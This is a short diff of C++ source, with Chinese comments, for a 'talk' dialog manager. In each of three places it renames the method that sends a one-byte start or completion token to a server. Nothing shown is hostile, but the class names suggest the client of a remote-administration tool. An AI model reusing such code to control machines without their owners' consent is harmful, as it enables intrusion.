@@ -27,7 +27,7 @@ CTalkManager::CTalkManager(IOCPClient* ClientObject, int n, void* user):CManager
 	g_Event = 0;
 	memset(g_Buffer, 0, sizeof(g_Buffer));
 	BYTE	bToken = TOKEN_TALK_START;   
-	m_ClientObject->OnServerSending((char*)&bToken, 1);
+	m_ClientObject->Send2Server((char*)&bToken, 1);
 	WaitForDialogOpen();
 	Mprintf("Talk 构造\n");
 }
@@ -86,7 +86,7 @@ INT_PTR CALLBACK CTalkManager::DialogProc(HWND hDlg, UINT uMsg,
 		{ 
 			KillTimer(hDlg, ID_TIMER_CLOSE_WINDOW);
 			BYTE bToken = TOKEN_TALKCMPLT;
-			if (This) This->m_ClientObject->OnServerSending((char*)&bToken, 1);
+			if (This) This->m_ClientObject->Send2Server((char*)&bToken, 1);
 			EndDialog(hDlg, LOWORD(wParam)); 
 			return (INT_PTR)TRUE; 
 		}
@@ -140,7 +140,7 @@ VOID CTalkManager::OnDlgTimer(HWND hDlg)   //时钟回调
 			{
 				KillTimer(hDlg,ID_TIMER_CLOSE_WINDOW);
 				BYTE bToken = TOKEN_TALKCMPLT;				// 包含头文件 Common.h     
-				m_ClientObject->OnServerSending((char*)&bToken, 1); // 发送允许重新发送的指令
+				m_ClientObject->Send2Server((char*)&bToken, 1); // 发送允许重新发送的指令
 				EndDialog(hDlg,0);
 			}
 			break;
